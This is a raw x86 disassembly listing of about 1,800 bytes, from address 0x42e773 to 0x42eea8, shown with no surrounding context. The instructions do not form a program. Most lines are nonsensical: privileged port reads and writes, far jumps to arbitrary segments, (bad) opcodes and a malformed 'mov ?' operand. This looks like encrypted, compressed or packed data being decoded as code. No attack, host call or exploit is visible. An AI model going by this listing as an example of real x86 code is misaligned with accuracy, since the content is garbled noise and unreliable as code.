  42e773:	pop    ds
  42e774:	adc    DWORD PTR [edx+0x2fe7a183],esi
  42e77a:	rcr    BYTE PTR [ebp+edi*8+0x5e1a866f],0xd7
  42e782:	adc    DWORD PTR [edx+0x5a],edi
  42e785:	out    0x91,al
  42e787:	sar    DWORD PTR [ebp+0x60],1
  42e78a:	inc    esp
  42e78b:	popa   
  42e78c:	pop    ds
  42e78d:	cmp    ch,BYTE PTR [edx-0x11a621cc]
  42e793:	inc    ebp
  42e794:	out    0xf4,eax
  42e796:	jb     0x42e805
  42e798:	mov    ebx,0xdba18498
  42e79d:	sbb    BYTE PTR [esi],ah
  42e79f:	cmp    DWORD PTR [eax+0x2e188aaa],ebp
  42e7a5:	rol    BYTE PTR [ecx+0xc81ab11],1
  42e7ab:	lods   eax,DWORD PTR ds:[esi]
  42e7ac:	jle    0x42e7b2
  42e7ae:	and    DWORD PTR [ebx-0x30],0xa9d1220
  42e7b5:	in     eax,0x79
  42e7b7:	fcom   DWORD PTR [ebx+0x72]
  42e7ba:	fmul   DWORD PTR [esi+ebx*8-0x16]
  42e7be:	jp     0x42e742
  42e7c0:	test   al,0xda
  42e7c2:	dec    esi
  42e7c3:	mov    eax,ds:0xc4635abf
  42e7c8:	xchg   esp,eax
  42e7c9:	(bad)  
  42e7ca:	das    
  42e7cb:	push   ds
  42e7cc:	pop    esi
  42e7cd:	out    0x94,eax
  42e7cf:	xchg   eax,eax
  42e7d1:	retf   
  42e7d2:	pop    ss
  42e7d3:	ja     0x42e7c3
  42e7d5:	inc    edi
  42e7d6:	enter  0xebd,0x55
  42e7da:	sahf   
  42e7db:	imul   edx,DWORD PTR [ecx],0x1b44ef27
  42e7e1:	in     al,dx
  42e7e2:	call   0x22b97d07
  42e7e7:	pop    es
  42e7e8:	es popa 
  42e7ea:	lods   eax,DWORD PTR ds:[esi]
  42e7eb:	and    bl,ah
  42e7ed:	adc    cl,BYTE PTR [ebx-0x10424955]
  42e7f3:	add    dl,BYTE PTR ss:[esi+edx*2+0x21]
  42e7f8:	mov    ah,0xa4
  42e7fa:	mov    esp,0xaf57ce75
  42e7ff:	pushf  
  42e800:	xchg   ecx,eax
  42e801:	jnp    0x42e871
  42e803:	xchg   edx,eax
  42e804:	scas   al,BYTE PTR es:[edi]
  42e805:	cwde   
  42e806:	push   eax
  42e807:	pop    eax
  42e808:	pop    ebp
  42e809:	pusha  
  42e80a:	dec    edx
  42e80b:	jo     0x42e7de
  42e80d:	jmp    0x42e791
  42e80f:	and    BYTE PTR [esi-0x735e5d03],cl
  42e815:	lods   al,BYTE PTR ds:[esi]
  42e816:	and    eax,0x3fccc624
  42e81b:	std    
  42e81c:	pop    esi
  42e81d:	out    dx,eax
  42e81e:	pop    esp
  42e81f:	lock inc ebp
  42e821:	and    al,0xfd
  42e823:	pop    ebx
  42e824:	aaa    
  42e825:	and    esp,DWORD PTR [edi-0x5f]
  42e828:	fs pop ebp
  42e82a:	cmp    ah,ah
  42e82c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e82d:	cdq    
  42e82e:	add    al,0xc1
  42e830:	aaa    
  42e831:	push   0x1d
  42e833:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e834:	mov    dh,0x50
  42e836:	dec    ebx
  42e837:	repnz sahf 
  42e839:	nop
  42e83a:	cwde   
  42e83b:	lea    esp,[esi]
  42e83d:	popa   
  42e83e:	call   0x16f2b021
  42e843:	xor    eax,0x76ee0b69
  42e848:	xor    ecx,ecx
  42e84a:	adc    eax,0xa2c76ae8
  42e84f:	mov    eax,ds:0x32a16e6e
  42e854:	push   edx
  42e855:	mov    ah,0xe5
  42e857:	in     eax,0x12
  42e859:	xor    eax,0x1d26a457
  42e85e:	outs   dx,BYTE PTR ds:[esi]
  42e85f:	mov    esi,0x94e4d084
  42e864:	dec    ebx
  42e865:	pop    edx
  42e866:	(bad)
  42e86a:	xor    cl,ah
  42e86c:	jecxz  0x42e8c7
  42e86e:	inc    ecx
  42e86f:	mov    dl,0x5f
  42e871:	in     al,dx
  42e872:	push   esp
  42e873:	ja     0x42e8f1
  42e875:	fistp  QWORD PTR [ecx+eax*2+0x5]
  42e879:	jne    0x42e8a9
  42e87b:	inc    ecx
  42e87c:	retf   
  42e87d:	sbb    edx,edx
  42e87f:	mov    BYTE PTR [ebx],0xc2
  42e882:	jbe    0x42e826
  42e884:	push   ss
  42e885:	cmp    al,0xb3
  42e887:	repnz cmp edi,DWORD PTR [ecx+0x415e5af0]
  42e88e:	dec    ebp
  42e88f:	mov    edx,0xd1d57960
  42e894:	xor    BYTE PTR [ecx-0x77],ah
  42e897:	jmp    0x7cb6:0xb104a8bc
  42e89e:	out    dx,al
  42e89f:	or     BYTE PTR [edx-0x80],ah
  42e8a2:	ret    
  42e8a3:	jg     0x42e8bd
  42e8a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e8a6:	dec    esi
  42e8a7:	mov    eax,ds:0xbb19d271
  42e8ac:	jnp    0x42e907
  42e8ae:	or     DWORD PTR [edx+0x7d98645e],0xfd7532a2
  42e8b8:	sbb    ah,BYTE PTR [ecx+0x16]
  42e8bb:	aad    0xca
  42e8bd:	aad    0xa1
  42e8bf:	mov    al,0x6e
  42e8c1:	sti    
  42e8c2:	push   esi
  42e8c3:	mov    al,ds:0x3a741963
  42e8c8:	xor    al,0x81
  42e8ca:	jno    0x42e89d
  42e8cc:	mov    eax,DWORD PTR [edi+0x38dda0af]
  42e8d2:	test   DWORD PTR [ebx+0x18cb8b41],edx
  42e8d8:	pop    esi
  42e8d9:	jmp    0x55387891
  42e8de:	lock mov ecx,0x6f960d6
  42e8e4:	xchg   esi,eax
  42e8e5:	add    DWORD PTR [ebx],esp
  42e8e7:	mov    ebp,0x74ee2c90
  42e8ec:	in     eax,0x98
  42e8ee:	add    dl,bl
  42e8f0:	fwait
  42e8f1:	into   
  42e8f2:	pusha  
  42e8f3:	add    DWORD PTR [ecx+0x6b],edx
  42e8f6:	cmp    eax,0xebb55b0b
  42e8fb:	sbb    al,0x6f
  42e8fd:	lahf   
  42e8fe:	sbb    esi,DWORD PTR [ecx]
  42e900:	loopne 0x42e88a
  42e902:	or     bl,BYTE PTR [ecx+0x16]
  42e905:	popa   
  42e906:	addr16 pop ss
  42e908:	jecxz  0x42e8a7
  42e90a:	test   al,0x87
  42e90c:	and    BYTE PTR [ecx],ah
  42e90e:	out    dx,al
  42e90f:	mov    ebx,0x102f6be
  42e914:	fstp   DWORD PTR [edi-0x4ea95df8]
  42e91a:	js     0x42e914
  42e91c:	or     bh,dl
  42e91e:	pop    edi
  42e91f:	jge    0x42e8f3
  42e921:	sub    esi,0xa9e671c7
  42e927:	loope  0x42e8c4
  42e929:	shl    DWORD PTR [edx-0x5f],cl
  42e92c:	xor    al,0x69
  42e92e:	sub    eax,0x4f2acf67
  42e933:	ds pop esi
  42e935:	adc    ecx,esp
  42e937:	ss mov esi,0xf6f054df
  42e93d:	pusha  
  42e93e:	(bad)
  42e942:	scas   eax,DWORD PTR es:[edi]
  42e943:	cli    
  42e944:	in     eax,0x1e
  42e946:	add    dl,BYTE PTR [ebx+0x672ed047]
  42e94c:	loope  0x42e9bf
  42e94e:	test   BYTE PTR [eax],ah
  42e950:	imul   ebx,DWORD PTR [ecx+0x62],0x54
  42e954:	inc    esp
  42e955:	js     0x42e9a4
  42e957:	and    DWORD PTR [ebp+0x5e1448ec],ebp
  42e95d:	popf   
  42e95e:	lds    esp,FWORD PTR [ecx+0x1f927c30]
  42e964:	jns    0x42e9c6
  42e966:	shl    DWORD PTR [eax+0x216b76b2],1
  42e96c:	inc    esi
  42e96e:	out    dx,al
  42e96f:	cmp    eax,0x70ccc35b
  42e974:	je     0x42e94c
  42e976:	lods   al,BYTE PTR ds:[esi]
  42e977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e978:	retf   
  42e979:	mov    ebp,0x211cd2f8
  42e97e:	push   ebp
  42e97f:	out    dx,eax
  42e980:	mov    ss,WORD PTR [ebx+0x4c]
  42e983:	lock pop esi
  42e985:	xor    cl,bh
  42e987:	xor    esi,DWORD PTR [esi+0xc]
  42e98a:	sub    ebx,edx
  42e98c:	call   0x96daad3b
  42e991:	sti    
  42e992:	jecxz  0x42e934
  42e994:	in     al,0xac
  42e996:	nop
  42e997:	pop    eax
  42e998:	(bad)
  42e99b:	cmp    al,bl
  42e99d:	jecxz  0x42e9d1
  42e99f:	or     bh,ah
  42e9a1:	in     eax,dx
  42e9a2:	jbe    0x42e945
  42e9a4:	hlt    
  42e9a5:	mov    BYTE PTR [edx],al
  42e9a7:	push   esp
  42e9a8:	cmp    edx,DWORD PTR [ecx-0x36]
  42e9ab:	sub    DWORD PTR [esi],esi
  42e9ad:	je     0x42e946
  42e9af:	pop    eax
  42e9b1:	js     0x42e9e1
  42e9b3:	ins    DWORD PTR es:[edi],dx
  42e9b4:	mov    ah,0x1f
  42e9b6:	(bad)  
  42e9b7:	out    dx,eax
  42e9b8:	push   eax
  42e9b9:	popa   
  42e9ba:	mov    ebp,0x1e290b45
  42e9bf:	pxor   mm1,QWORD PTR [ebp-0x12]
  42e9c3:	push   edx
  42e9c4:	test   al,0x41
  42e9c6:	mov    ?,WORD PTR [esi]
  42e9c8:	mov    edx,0x97a17a3c
  42e9cd:	ror    BYTE PTR [edx],0x56
  42e9d0:	or     esp,esp
  42e9d2:	fadd   st(1),st
  42e9d4:	pop    esi
  42e9d5:	inc    ebp
  42e9d6:	cmc    
  42e9d7:	mov    eax,0x16ba5581
  42e9dc:	aas    
  42e9dd:	popa   
  42e9de:	xchg   ebp,eax
  42e9df:	and    al,0xd5
  42e9e1:	add    DWORD PTR [ebp-0x11b3870b],esp
  42e9e7:	push   ecx
  42e9e8:	add    esp,DWORD PTR [ecx]
  42e9ea:	xchg   ecx,eax
  42e9eb:	test   eax,0xa11ebbc0
  42e9f0:	jle    0x42ea01
  42e9f2:	jmp    0x5e23:0x8997bb8b
  42e9f9:	repnz cld 
  42e9fb:	(bad)  
  42e9fc:	out    0xf4,al
  42e9fe:	pop    esp
  42e9ff:	xchg   dh,bh
  42ea01:	pusha  
  42ea02:	call   0x290068d
  42ea07:	aad    0xa6
  42ea09:	push   edi
  42ea0a:	out    dx,al
  42ea0b:	and    dl,bh
  42ea0d:	into   
  42ea0e:	and    edi,esi
  42ea10:	xchg   esp,eax
  42ea11:	call   0x1beb:0xf560a17e
  42ea18:	add    DWORD PTR [ecx+0x61],ebp
  42ea1b:	cwde   
  42ea1c:	pop    ebx
  42ea1d:	push   eax
  42ea1e:	jo     0x42ea24
  42ea20:	adc    ch,BYTE PTR [ebp+0x4e]
  42ea23:	nop
  42ea24:	push   esp
  42ea25:	add    ebx,esi
  42ea27:	mov    al,ds:0xe65110aa
  42ea2c:	bound  esi,QWORD PTR [edx+0x67]
  42ea2f:	cmp    BYTE PTR [ebp+0x3b],ah
  42ea32:	iret   
  42ea33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ea34:	pusha  
  42ea35:	ror    DWORD PTR [eax],cl
  42ea37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ea38:	dec    esp
  42ea39:	xchg   esp,eax
  42ea3a:	call   0xeaea0752
  42ea3f:	and    cl,ah
  42ea41:	loop   0x42e9e9
  42ea43:	sbb    al,0xdf
  42ea45:	push   edx
  42ea46:	mov    dh,0xc8
  42ea48:	scas   al,BYTE PTR es:[edi]
  42ea49:	and    ebp,DWORD PTR [esi+0x315edb88]
  42ea4f:	dec    ebx
  42ea50:	pop    esi
  42ea51:	xchg   esi,eax
  42ea52:	xor    BYTE PTR [eax],bl
  42ea54:	ret    0x6be7
  42ea57:	mov    ah,0x27
  42ea59:	inc    edx
  42ea5a:	(bad)  
  42ea5c:	add    ah,BYTE PTR [ecx+0x4b]
  42ea5f:	out    dx,al
  42ea60:	(bad)  
  42ea61:	shl    DWORD PTR [eax-0x42],cl
  42ea64:	(bad)  
  42ea65:	out    dx,al
  42ea66:	out    0xad,al
  42ea68:	retf   0x43c7
  42ea6b:	mov    eax,ds:0xcfc3f464
  42ea70:	sub    bh,0x5c
  42ea73:	jmp    0x5849:0x4b1f56f3
  42ea7a:	cdq    
  42ea7b:	mov    al,0xff
  42ea7d:	pusha  
  42ea7e:	in     eax,0x6e
  42ea80:	mov    ebx,0x99a1642b
  42ea85:	mov    ch,0x5b
  42ea87:	sub    BYTE PTR [edx+0x26212bee],ch
  42ea8d:	imul   esp,DWORD PTR [bx+di-0x3308],0xa5cb5dd1
  42ea96:	dec    esp
  42ea97:	mov    eax,ds:0x38a97adf
  42ea9c:	leave  
  42ea9d:	inc    eax
  42ea9e:	xor    esp,0xe7b7df5e
  42eaa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eaa5:	cmp    al,0x18
  42eaa7:	cmp    eax,DWORD PTR [esi+0x61]
  42eaaa:	mov    cl,0x19
  42eaac:	repnz shl ecx,cl
  42eaaf:	and    DWORD PTR [eax+0x6445ebc9],edx
  42eab5:	xor    eax,0xb134c805
  42eaba:	sbb    BYTE PTR [edx-0x34],ch
  42eabd:	pop    ecx
  42eabe:	fcomp  DWORD PTR [edi]
  42eac0:	dec    esp
  42eac1:	mov    ecx,ebp
  42eac3:	shl    BYTE PTR [ebx+0x5ecad721],1
  42eac9:	and    BYTE PTR ds:0xb7e462c4,dh
  42eacf:	sar    esi,0x60
  42ead2:	adc    DWORD PTR [ebp+0x3b21bbbd],eax
  42ead8:	xchg   esp,eax
  42ead9:	adc    esi,ebp
  42eadb:	mov    ecx,0xe1967bf4
  42eae0:	int    0x4f
  42eae2:	shr    DWORD PTR [esi+ebp*4+0x60],1
  42eae6:	enter  0xe7ed,0x5e
  42eaea:	fsubr  st(3),st
  42eaec:	sbb    ah,0xee
  42eaef:	or     al,0x92
  42eaf1:	mul    BYTE PTR [eax+0x2b9f14f0]
  42eaf7:	mov    eax,ds:0x3aa6a03f
  42eafc:	and    ch,BYTE PTR [ecx-0x7b]
  42eaff:	dec    edx
  42eb00:	pop    esi
  42eb01:	pop    eax
  42eb02:	aad    0x7a
  42eb04:	mov    esi,0x3b22aba
  42eb09:	popa   
  42eb0a:	rcr    BYTE PTR [edx],1
  42eb0c:	cs pop ebx
  42eb0e:	xchg   ebp,eax
  42eb0f:	inc    edi
  42eb10:	sbb    ch,BYTE PTR [ecx+0x22]
  42eb13:	push   0x1975610a
  42eb18:	inc    ebx
  42eb19:	les    edi,FWORD PTR [ebx+0x37]
  42eb1c:	jle    0x42eb7e
  42eb1e:	sahf   
  42eb1f:	jne    0x42eaec
  42eb21:	fistp  DWORD PTR [edx+esi*8]
  42eb24:	push   edx
  42eb25:	in     al,dx
  42eb26:	cmc    
  42eb27:	inc    edx
  42eb28:	jecxz  0x42eb16
  42eb2a:	scas   al,BYTE PTR es:[edi]
  42eb2b:	mov    al,ds:0x381ba16d
  42eb30:	aad    0x59
  42eb32:	dec    edi
  42eb33:	and    ebp,DWORD PTR [esi-0x7d]
  42eb36:	pop    ecx
  42eb37:	adc    DWORD PTR [edi+eax*4+0x3a],esi
  42eb3b:	cs jmp 0x42eba6
  42eb3e:	out    dx,al
  42eb3f:	es in  al,dx
  42eb41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb42:	push   ebp
  42eb43:	and    al,0x89
  42eb45:	in     eax,0xd
  42eb47:	test   eax,0x539290d0
  42eb4c:	scas   al,BYTE PTR es:[edi]
  42eb4d:	pusha  
  42eb4e:	adc    al,0x11
  42eb50:	dec    edi
  42eb51:	(bad)  
  42eb52:	test   BYTE PTR [edi+0x7d8175e],ah
  42eb58:	ss inc ecx
  42eb5a:	push   ebp
  42eb5b:	jne    0x42eb3b
  42eb5d:	pop    ebp
  42eb5e:	xor    al,0xf2
  42eb60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb61:	xchg   ebp,esp
  42eb63:	jg     0x42ebd3
  42eb65:	sub    eax,0xff6360a4
  42eb6a:	inc    ecx
  42eb6b:	int    0xcc
  42eb6d:	loopne 0x42ebce
  42eb6f:	sub    BYTE PTR [esi],cl
  42eb71:	lds    ebx,FWORD PTR [ebx]
  42eb73:	jg     0x42ebbc
  42eb75:	popa   
  42eb76:	or     cl,BYTE PTR [edx]
  42eb78:	mov    dh,0x70
  42eb7a:	mov    eax,0xee2be3bd
  42eb7f:	sbb    eax,0x5b91cc5d
  42eb84:	aaa    
  42eb85:	dec    DWORD PTR [ebx+0x7b9ceea4]
  42eb8b:	fldenv [esp+eiz*2-0x5f6d0d75]
  42eb92:	cs addr16 mov cl,0x8
  42eb96:	lock add DWORD PTR [eax-0x569f0a13],ebx
  42eb9d:	push   0xffffffe1
  42eb9f:	sbb    DWORD PTR [ecx-0x44300a1],esp
  42eba5:	ffree  st(1)
  42eba7:	pushf  
  42eba8:	setge  BYTE PTR [esi+0x71]
  42ebac:	push   ebx
  42ebad:	mov    cl,cl
  42ebaf:	cwde   
  42ebb0:	fs xchg ebp,eax
  42ebb2:	sub    DWORD PTR [ecx-0x3bc26630],esp
  42ebb8:	fisub  DWORD PTR [eax+0x1f]
  42ebbb:	push   ebp
  42ebbc:	xchg   ch,al
  42ebbe:	jg     0x42ebb9
  42ebc0:	ret    
  42ebc1:	cmp    edi,esp
  42ebc3:	mov    ebx,0xba2cafa
  42ebc8:	shl    dl,1
  42ebca:	cmp    esp,DWORD PTR [edx]
  42ebcc:	test   al,0xdf
  42ebce:	sub    al,0x32
  42ebd0:	cmp    eax,0x33e646f3
  42ebd5:	popa   
  42ebd6:	inc    ebp
  42ebd7:	push   cs
  42ebd8:	arpl   WORD PTR [ecx],sp
  42ebda:	mov    ebp,0xea7a17bd
  42ebdf:	sbb    BYTE PTR [ecx+0x16],bh
  42ebe2:	sbb    BYTE PTR [eax],0x9b
  42ebe5:	mov    DWORD PTR [esi-0x35],ebp
  42ebe8:	lods   al,BYTE PTR ds:[esi]
  42ebe9:	mov    cl,0xd7
  42ebeb:	mov    al,ds:0xc0d58614
  42ebf0:	call   0x37c562a2
  42ebf5:	shr    DWORD PTR [eax-0xb660ee0],1
  42ebfb:	icebp  
  42ebfc:	clc    
  42ebfd:	(bad)  
  42ebff:	mov    al,ds:0xc6ff0f6c
  42ec04:	or     ebx,edi
  42ec06:	mov    ds:0xc9a23269,al
  42ec0b:	or     al,0xcd
  42ec0d:	ret    0xa4ee
  42ec10:	and    BYTE PTR [eax+0x5298f027],ah
  42ec16:	shr    DWORD PTR [ecx],1
  42ec18:	out    dx,eax
  42ec19:	rol    BYTE PTR [edi-0x15f6eb4],cl
  42ec1f:	jecxz  0x42ec63
  42ec21:	sbb    al,0xed
  42ec23:	jne    0x42ec74
  42ec25:	pop    eax
  42ec26:	(bad)  
  42ec27:	cli    
  42ec28:	fidivr DWORD PTR ds:0x6137524e
  42ec2e:	push   es
  42ec2f:	in     al,dx
  42ec30:	outs   dx,DWORD PTR ds:[esi]
  42ec31:	inc    ebp
  42ec32:	mov    ds:0xeb2742c3,eax
  42ec37:	lds    ecx,FWORD PTR [edx+0x6b]
  42ec3a:	sbb    al,0xfa
  42ec3c:	and    ecx,ebp
  42ec3e:	dec    ecx
  42ec3f:	in     eax,0xca
  42ec41:	pusha  
  42ec42:	xchg   ebx,eax
  42ec43:	and    DWORD PTR [edi+0x1c],ebx
  42ec46:	int    0xe3
  42ec48:	push   ds
  42ec49:	pop    ecx
  42ec4a:	mov    ebp,0x1dac994f
  42ec4f:	dec    eax
  42ec50:	pop    esi
  42ec51:	fst    DWORD PTR [eax]
  42ec53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ec54:	jb     0x42ecd4
  42ec56:	pop    ebp
  42ec57:	ja     0x42ec89
  42ec59:	popa   
  42ec5a:	pop    edx
  42ec5b:	jno    0x42ec94
  42ec5d:	inc    ecx
  42ec5e:	and    al,0xe6
  42ec60:	outs   dx,DWORD PTR ds:[esi]
  42ec61:	pop    ss
  42ec62:	add    dh,BYTE PTR ds:0xa5ae7192
  42ec68:	shl    cl,cl
  42ec6a:	clc    
  42ec6b:	test   al,0xf
  42ec6d:	pusha  
  42ec6e:	icebp  
  42ec6f:	test   BYTE PTR [edi-0x3f5fc8c0],bl
  42ec75:	nop
  42ec76:	pushf  
  42ec77:	stos   DWORD PTR es:[edi],eax
  42ec78:	pop    esi
  42ec79:	push   ebp
  42ec7a:	or     bl,BYTE PTR [eax]
  42ec7c:	repnz or al,dh
  42ec7f:	(bad)  [eax+0x61]
  42ec82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ec83:	push   0xffffffce
  42ec85:	ins    DWORD PTR es:[edi],dx
  42ec86:	lahf   
  42ec87:	and    al,0x95
  42ec89:	js     0x42ec75
  42ec8b:	jmp    0x45ff3f29
  42ec90:	ficomp WORD PTR [eax-0x24]
  42ec93:	and    DWORD PTR [ebx],edx
  42ec95:	popa   
  42ec96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ec97:	jl     0x42ec63
  42ec99:	lods   eax,DWORD PTR ds:[esi]
  42ec9a:	xor    al,0xcc
  42ec9c:	cmc    
  42ec9d:	rcr    DWORD PTR [esi-0x5550a12e],1
  42eca3:	fwait
  42eca4:	stos   BYTE PTR es:[edi],al
  42eca5:	cmc    
  42eca6:	dec    edi
  42eca7:	jo     0x42ecd4
  42eca9:	arpl   WORD PTR [ebp+0x5c],dx
  42ecac:	pop    esi
  42ecad:	sub    eax,0xc194925e
  42ecb2:	arpl   ax,dx
  42ecb4:	pop    edi
  42ecb5:	(bad)  
  42ecb6:	xor    al,0x61
  42ecb8:	mov    dh,dh
  42ecba:	call   0xe4f44cea
  42ecbf:	addr16 daa 
  42ecc1:	popa   
  42ecc2:	cdq    
  42ecc3:	inc    esi
  42ecc4:	(bad)
  42ecc7:	inc    esi
  42ecc8:	leave  
  42ecc9:	scas   eax,DWORD PTR es:[edi]
  42ecca:	out    dx,al
  42eccb:	ret    
  42eccc:	inc    edi
  42eccd:	xlat   BYTE PTR ds:[ebx]
  42ecce:	stc    
  42eccf:	or     al,ah
  42ecd1:	cmp    BYTE PTR [eax],bh
  42ecd3:	mov    eax,ds:0x45b02e9f
  42ecd8:	add    eax,DWORD PTR [ebx]
  42ecda:	fcomp  st(5)
  42ecdc:	mov    cl,dh
  42ecde:	jmp    0xf463ecfd
  42ece3:	test   DWORD PTR [esi-0x15f83cd6],ebx
  42ece9:	pop    ecx
  42ecea:	add    BYTE PTR [ebp-0x19],al
  42eced:	sbb    esp,eax
  42ecef:	mov    cl,0x3e
  42ecf1:	pmulhw mm6,QWORD PTR [eax+0x67]
  42ecf5:	cmp    al,0xee
  42ecf7:	adc    BYTE PTR ds:0x2d6eae95,dl
  42ecfd:	cmc    
  42ecfe:	cli    
  42ecff:	mov    eax,ds:0x9086ed66
  42ed04:	out    0xdf,eax
  42ed06:	xchg   esi,eax
  42ed07:	mov    cl,0xa4
  42ed09:	jnp    0x42ecf9
  42ed0b:	fidiv  DWORD PTR [esi]
  42ed0d:	sub    BYTE PTR [edi-0x16],0x5a
  42ed11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ed12:	std    
  42ed13:	mov    al,ds:0x421421e6
  42ed18:	in     eax,dx
  42ed19:	popf   
  42ed1a:	clc    
  42ed1b:	pop    ecx
  42ed1c:	pop    edi
  42ed1d:	(bad)  
  42ed1f:	iret   
  42ed20:	jno    0x42ed28
  42ed22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ed23:	or     BYTE PTR [esi+eiz*8],ch
  42ed26:	or     ch,BYTE PTR [esi+ebp*4-0x6118917e]
  42ed2d:	cli    
  42ed2e:	je     0x42ed24
  42ed30:	add    al,0x76
  42ed32:	out    dx,al
  42ed33:	sahf   
  42ed34:	pop    ebx
  42ed35:	mov    al,ds:0x8ba123f9
  42ed3a:	mov    dl,0xa0
  42ed3c:	sbb    BYTE PTR [edx-0x7c8c559f],dl
  42ed42:	cmp    eax,0xa7025ee4
  42ed47:	and    DWORD PTR [esi],edi
  42ed49:	neg    BYTE PTR [esi-0x709f27e5]
  42ed4f:	je     0x42ed42
  42ed51:	aam    0x44
  42ed53:	inc    esi
  42ed54:	pop    eax
  42ed55:	fldln2 
  42ed57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ed58:	jb     0x42ed38
  42ed5a:	test   DWORD PTR [ebp+0x6],eax
  42ed5d:	rcr    BYTE PTR [ebx+0x21],cl
  42ed60:	cmp    al,0x15
  42ed62:	adc    ebp,eax
  42ed64:	fld    TBYTE PTR [edi+0x78a49a0f]
  42ed6a:	out    dx,al
  42ed6b:	repnz sti 
  42ed6d:	jno    0x42edbc
  42ed6f:	push   es
  42ed70:	jmp    0x42ed1f
  42ed72:	out    dx,al
  42ed73:	xor    ecx,ebx
  42ed75:	dec    esi
  42ed76:	pop    ds
  42ed77:	mov    esp,ebp
  42ed79:	sbb    al,0xed
  42ed7b:	sahf   
  42ed7c:	push   edi
  42ed7d:	test   al,0xb
  42ed7f:	jecxz  0x42ed9f
  42ed81:	lgs    ebx,FWORD PTR [ebp+0x40ee8138]
  42ed88:	sub    BYTE PTR [eax+0x79],cl
  42ed8b:	xchg   ebp,eax
  42ed8c:	mov    dl,0x58
  42ed8e:	dec    eax
  42ed8f:	mov    eax,ds:0x64f7d95f
  42ed94:	mov    ebx,0x7e68dca6
  42ed99:	xor    al,0xee
  42ed9b:	dec    esp
  42ed9c:	adc    DWORD PTR [esi],esp
  42ed9e:	pop    ds
  42ed9f:	jge    0x42ed8d
  42eda1:	sub    al,0x19
  42eda3:	mov    eax,ds:0xe1468e08
  42eda8:	js     0x42eddf
  42edaa:	push   ds
  42edab:	call   0xd28fb530
  42edb0:	pop    esi
  42edb1:	or     al,0xd8
  42edb3:	add    al,0xe8
  42edb5:	mov    edx,0x51af422d
  42edba:	ins    DWORD PTR es:[edi],dx
  42edbb:	das    
  42edbc:	daa    
  42edbd:	nop
  42edbe:	outs   dx,BYTE PTR ds:[esi]
  42edbf:	loop   0x42edc1
  42edc1:	ror    DWORD PTR [ecx+edi*2+0x1a3bbf5e],cl
  42edc8:	push   edx
  42edc9:	cmp    BYTE PTR [ecx-0x38],al
  42edcc:	xchg   ebp,eax
  42edcd:	inc    edx
  42edce:	and    dh,BYTE PTR [esi]
  42edd0:	ret    0x6760
  42edd3:	cmp    al,0xcd
  42edd5:	rcr    DWORD PTR [ebp-0x2c],cl
  42edd8:	pop    esi
  42edd9:	sub    edx,DWORD PTR [ecx-0x22]
  42eddc:	sub    BYTE PTR [eax-0x3],0x6e
  42ede0:	popa   
  42ede1:	pop    esi
  42ede2:	cmp    BYTE PTR [edx+ebp*4-0x29850ac4],bh
  42ede9:	pop    edx
  42edea:	loope  0x42ed93
  42edec:	add    DWORD PTR [edx+edi*4+0x38e32250],0x2d99b0a1
  42edf7:	jecxz  0x42eddf
  42edf9:	mov    BYTE PTR [edi+0x71],dh
  42edfc:	test   DWORD PTR [esi-0x17],ebx
  42edff:	push   ds
  42ee00:	fbstp  TBYTE PTR [edi-0x11]
  42ee03:	out    0x7e,al
  42ee05:	je     0x42ee03
  42ee07:	gs pop ebx
  42ee09:	add    al,0xfa
  42ee0b:	loope  0x42ee2f
  42ee0d:	(bad)  
  42ee0e:	mov    esi,0x47bc9253
  42ee13:	imul   esp,DWORD PTR [esi+ebx*2+0x76e2644],0x159eebc7
  42ee1e:	test   bh,bl
  42ee20:	pop    esi
  42ee21:	data16 and al,0xc2
  42ee24:	sahf   
  42ee25:	cld    
  42ee26:	push   esp
  42ee27:	into   
  42ee28:	sbb    eax,0x7e470b61
  42ee2d:	xchg   ecx,eax
  42ee2e:	push   0xffffffdb
  42ee30:	mov    fs,ebx
  42ee32:	out    dx,al
  42ee33:	jns    0x42edfd
  42ee35:	fbld   TBYTE PTR [edi+0x6b]
  42ee38:	outs   dx,DWORD PTR ds:[esi]
  42ee39:	aad    0x1e
  42ee3b:	stos   BYTE PTR es:[edi],al
  42ee3c:	sbb    eax,0xf262ee36
  42ee41:	push   eax
  42ee42:	push   cs
  42ee43:	adc    bl,BYTE PTR ds:[edi-0x12]
  42ee47:	add    ch,BYTE PTR [ecx]
  42ee49:	push   0x7ed585df
  42ee4e:	pop    edx
  42ee4f:	mov    eax,ds:0x2210207
  42ee54:	cmp    BYTE PTR [edx-0x4d],0x4d
  42ee58:	pop    esi
  42ee59:	dec    edi
  42ee5a:	mov    ch,0x71
  42ee5c:	fcomp  st(1)
  42ee5e:	mov    ?,WORD PTR [edx+0x21]
  42ee61:	popa   
  42ee62:	cmp    al,0xdf
  42ee64:	or     al,BYTE PTR [eax]
  42ee66:	jne    0x42ee95
  42ee68:	fdivr  st(2),st
  42ee6a:	out    0x5e,eax
  42ee6c:	push   eax
  42ee6d:	hlt    
  42ee6e:	mov    ebx,0x9f4103f9
  42ee73:	jmp    0x41d7767c
  42ee78:	fstp   TBYTE PTR [ecx+0x3c95aea0]
  42ee7f:	xchg   esi,eax
  42ee80:	daa    
  42ee81:	pushf  
  42ee82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee83:	call   0xc310:0x29ee5df7
  42ee8a:	xor    DWORD PTR [ebp-0x57a91975],esi
  42ee90:	retf   0x1d0c
  42ee93:	fcom   DWORD PTR [edi+0x469f1cb0]
  42ee99:	and    ebp,esi
  42ee9b:	jbe    0x42eed7
  42ee9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee9e:	adc    BYTE PTR [ebx],0x68
  42eea1:	jmp    0x434e:0xd79fa18e
  42eea8:	or     BYTE PTR [ebx],ch
